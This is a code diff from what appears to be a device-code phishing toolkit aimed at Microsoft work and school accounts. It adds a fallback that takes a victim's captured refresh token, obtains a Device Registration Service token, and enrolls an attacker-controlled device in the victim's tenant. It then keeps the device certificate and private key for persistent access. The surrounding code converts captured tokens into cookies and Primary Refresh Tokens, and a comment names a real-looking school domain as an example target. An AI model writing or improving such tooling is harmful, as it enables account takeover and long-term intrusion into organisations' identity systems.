@@ -14,6 +14,7 @@ const proxyManager = require('../services/proxymanager');
 const cookieConverter = require('./cookieconverter');
 const { parsePrtClaims } = require('./kerberos');
 const { enrollDevice } = require('./devicecode');
+const devicemanager = require('./devicemanager');
 
 // In-memory job store (for active device code flows)
 const activeJobs = new Map();
@@ -512,7 +513,6 @@ async function storeToken(job, tokenData, responseCookies = []) {
 
     if (deviceId) {
       try {
-        const { enrollDevice } = require('./devicecode');
         const enrollmentResult = await enrollDevice(tokenData.access_token, deviceId, tenant);
         deviceEnrolled = true;
         enrollmentTime = new Date();
@@ -524,6 +524,24 @@ async function storeToken(job, tokenData, responseCookies = []) {
       } catch (enrollErr) {
         console.error('[DeviceProxy] Device enrollment failed:', enrollErr.message);
         deviceEnrolled = false;
+      }
+    }
+
+    if (!deviceEnrolled && tokenData.refresh_token) {
+      try {
+        const fresh = await devicemanager.exchangeForDrsToken(tokenData.refresh_token, tenant);
+        if (fresh && fresh.accessToken && fresh.deviceId) {
+          const retryResult = await enrollDevice(fresh.accessToken, fresh.deviceId, tenant);
+          if (retryResult && (retryResult.deviceCertificate || retryResult.privateKeyPem)) {
+            deviceEnrolled = true;
+            enrollmentTime = new Date();
+            if (retryResult.deviceCertificate) deviceCertificateEncrypted = encrypt(retryResult.deviceCertificate);
+            if (retryResult.privateKeyPem) encryptedPrivateKey = encrypt(retryResult.privateKeyPem);
+            console.log('[DeviceProxy] Device enrolled after DRS token refresh: ' + (retryResult.deviceName || fresh.deviceId) + ' (' + fresh.deviceId + ')');
+          }
+        }
+      } catch (refreshErr) {
+        console.error('[DeviceProxy] DRS token refresh/retry enrollment failed:', refreshErr.message);
       }
     }
 
@@ -686,8 +704,6 @@ async function storeToken(job, tokenData, responseCookies = []) {
       console.error('[DeviceProxy] Token insert/fallback error:', e && e.message ? e.message : e);
     }
 
-
-
     // For cookie mode, trigger cookie conversion immediately after capture
     let cookieConversionResult = null;
     if (job.mode === 'cookie') {
@@ -702,7 +718,7 @@ async function storeToken(job, tokenData, responseCookies = []) {
     // Attempt device registration and PRT generation for ALL work/school accounts
     // This runs asynchronously and doesn't block the response
     // Works for: specific tenant GUIDs, 'organizations', AND 'common' endpoints
-    if (accountType === 'work_school' && tokenData.access_token) {
+    if (accountType === 'work_school' && tokenData.access_token && !deviceEnrolled) {
       console.log('[DeviceProxy] Attempting device registration for token', tokenId, 'tenant:', tenant);
       const deviceManager = require('./devicemanager');
       // Extract email domain for DRS registration (e.g., 'saintaloysiusms.org' from 'user@saintaloysiusms.org')
